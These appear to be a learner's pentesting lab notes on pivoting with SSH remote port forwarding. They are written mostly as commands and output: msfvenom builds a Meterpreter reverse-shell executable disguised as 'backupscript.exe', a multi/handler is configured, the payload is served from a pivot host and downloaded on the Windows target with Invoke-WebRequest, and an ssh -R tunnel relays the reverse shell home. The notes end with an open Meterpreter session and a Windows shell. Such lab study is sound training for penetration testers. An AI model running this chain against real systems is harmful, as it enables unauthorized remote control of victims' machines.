# Remote/Reverse Port Forwarding with SSH

Problem - The RDP session or or any shell we gained through [[ðŸ”µ 3. Dynamic Port Forwarding]] will not be able to talk directly to our attack host. 
Solution - We get a reverse shell on our system from these sessions. 
#### Creating a Windows Payload with msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

#### Configuring & Starting the multi/handler

Â Â Remote/Reverse Port Forwarding with SSH

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```
#### Transferring Payload to Pivot Host

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00 
```

After copying the payload, we will start aÂ `python3 HTTP server`Â using the below command on the Ubuntu server in the same directory where we copied our payload.
#### Starting Python3 Webserver on Pivot Host

```bash
ubuntu@Webserver$ python3 -m http.server 8123
```

#### Downloading Payload on the Windows Target

We can download thisÂ `backupscript.exe`Â on the Windows host via a web browser or the PowerShell cmdletÂ `Invoke-WebRequest`.

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Once we have our payload downloaded on the Windows host, we will useÂ `SSH remote port forwarding`Â to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will useÂ `-vN`Â argument in our SSH command to make it verbose and ask it not to prompt the login shell. TheÂ `-R`Â command asks the Ubuntu server to listen onÂ `<targetIPaddress>:8080`Â and forward all incoming connections on portÂ `8080`Â to our msfconsole listener onÂ `0.0.0.0:8000`Â of ourÂ `attack host`.
#### Using SSH -R

```bash
ssh -R <Internal IP of Pivot Host, different subnet but same as the internal subnet that is unreachable from outside>:<LPORT on attacker>:0.0.0.0:<> ubuntu@<ipAddressofTarget> -vN
```

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
#### Viewing the Logs from the Pivot

```bash
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

If all is set up properly, we will receive a Meterpreter shell pivoted via the Ubuntu server.
#### Meterpreter Session Established

```bash
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

